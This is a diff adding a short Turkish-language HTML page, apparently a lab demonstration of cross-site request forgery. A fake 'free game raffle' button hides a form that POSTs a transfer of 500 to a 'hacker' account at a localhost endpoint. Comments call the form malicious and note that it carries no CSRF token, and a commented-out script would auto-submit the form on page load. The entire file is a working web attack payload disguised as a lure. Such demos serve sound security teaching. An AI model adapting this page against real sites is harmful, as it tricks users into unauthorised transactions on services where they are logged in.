@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Bedava Oyun Kazan!</title>
+</head>
+<body>
+    <h1>Bu butona tıklayarak hemen çekilişe katıl!</h1>
+    
+    <!-- Hedef siteye kullanıcının haberi olmadan POST atan zararlı form -->
+    <!-- CSRF Token İÇERMEZ! -->
+    <form action="http://localhost:3000/transfer" method="POST" id="evilForm">
+        <input type="hidden" name="to" value="hacker_hesabi">
+        <input type="hidden" name="amount" value="500">
+        <button type="submit">Çekilişe Katıl!</button>
+    </form>
+
+    <script>
+        // İsteğe bağlı: Sayfa yüklenir yüklenmez formu otomatik tetikleyen script
+        // document.getElementById('evilForm').submit();
+    </script>
+</body>
+</html>
